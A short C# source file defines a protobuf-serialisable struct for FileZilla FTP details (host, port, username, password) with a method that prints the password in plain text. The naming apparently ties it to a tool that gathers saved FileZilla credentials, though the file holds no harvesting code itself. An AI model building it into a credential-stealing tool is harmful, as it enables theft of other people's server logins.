

using ProtoBuf;
using System;


namespace InvokedCommon.Structs
{
	[ProtoContract]
	public struct FileZillaInfo
	{
		[ProtoMember(1)]
		public string host;
		[ProtoMember(2)]
		public int port;
		[ProtoMember(3)]
		public string username;
		[ProtoMember(4)]
		public string password;

		public FileZillaInfo(string _host, int _port, string _username, string _password)
		{
			this.host = _host;
			this.port = _port;
			this.username = _username;
			this.password = _password;
		}

		public override string ToString()
		{
			return ("HOST: " + this.host + Environment.NewLine + "PORT: " + this.port.ToString() + Environment.NewLine + "USERNAME: " + this.username + Environment.NewLine + "PASSWORD: " + this.password).ToString();
		}
	}
}